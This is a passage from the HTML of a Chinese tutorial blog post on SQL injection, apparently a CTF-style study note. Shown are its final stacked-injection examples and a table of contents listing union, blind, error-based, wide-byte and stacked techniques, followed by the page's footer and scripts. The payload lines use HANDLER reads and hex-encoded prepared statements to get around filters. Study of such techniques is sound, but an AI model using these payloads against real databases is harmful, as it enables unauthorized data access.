+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">show tables;</span><br><span class="line">show columns from table;</span><br></pre></td></tr></table></figure></div>
+</li>
+</ul>
+<ol>
+<li>Handler 使用</li>
+</ol>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">handler test open;</span><br><span class="line">handler test read first;</span><br><span class="line">handler test close;</span><br></pre></td></tr></table></figure></div>
+<ol>
+<li>动态执行预处理</li>
+</ol>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @a=0xxxxx; # 要执行语句的16进制</span><br><span class="line">prepare test from @a;</span><br><span class="line">execute test;</span><br></pre></td></tr></table></figure></div>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> sql注入</li>
+        <li><strong>作者:</strong> The Redefine Team</li>
+        <li><strong>创建于
+                :</strong> 2025-03-09 23:01:07</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2025-03-09 23:22:13
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://redefine.ohevan.com/2025/03/09/sql注入/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/02/25/misc/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">misc</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">sql注入</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-text"> SQL 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80"><span class="nav-text"> 数据库基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-text"> 联合注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="nav-text"> 判断注入类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E5%88%97%E6%95%B0"><span class="nav-text"> 查列数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A1%AE%E5%AE%9A%E5%AD%97%E6%AE%B5%E4%BD%8D%E7%BD%AE"><span class="nav-text"> 确定字段位置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E8%A1%A8%E5%90%8D"><span class="nav-text"> 查表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E5%88%97%E5%90%8D"><span class="nav-text"> 查列名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="nav-text"> 获取数据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E7%9B%B2%E6%B3%A8"><span class="nav-text"> 无回显盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bool%E7%9B%B2%E6%B3%A8"><span class="nav-text"> bool 盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-text"> 时间盲注</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-text"> 报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-text"> 宽字节注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-text"> 堆叠注入</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">The Redefine Team</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 8 篇文章
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
